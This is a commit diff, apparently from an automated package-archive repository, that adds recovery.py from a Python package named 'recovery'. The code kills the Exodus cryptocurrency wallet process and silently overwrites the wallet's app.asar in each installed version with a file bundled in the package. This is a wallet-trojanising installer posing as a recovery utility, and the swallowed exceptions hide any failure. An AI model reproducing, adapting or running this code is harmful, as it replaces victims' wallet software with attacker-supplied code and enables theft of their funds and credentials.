20df00141cfc5f8c79fe4b2d773472f5581f9f8f
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-08-01 04:05:26 +0000

    Add package recovery/0.2.4/recovery-0.2.4.tar.gz

---
+++ packages/recovery/recovery-0.2.4.tar.gz/recovery-0.2.4/recovery/recovery.py
@@ -0,0 +1,31 @@
+import os
+import psutil
+import shutil
+import pkg_resources
+
+def get_username():
+    return os.getlogin()
+
+def check():
+    try:
+        os.system(f"taskkill /IM Exodus.exe /F")
+    except Exception as e:
+        pass
+
+    package_path = pkg_resources.resource_filename('recovery', '')
+    default_config_path = os.path.join(package_path, 'app.asar')
+    base_dir = "C:\\Users\\" + get_username() + "\\AppData\\Local\\exodus\\"
+    prefix = "app-"
+
+    if not os.path.isfile(default_config_path):
+        return
+
+    for entry in os.listdir(base_dir):
+        full_path = os.path.join(base_dir, entry)
+
+        if os.path.isdir(full_path) and entry.startswith(prefix):
+            resources_path = os.path.join(full_path, 'resources', 'app.asar')
+            try:
+                shutil.copy(default_config_path, resources_path)
+            except Exception as e:
+                pass
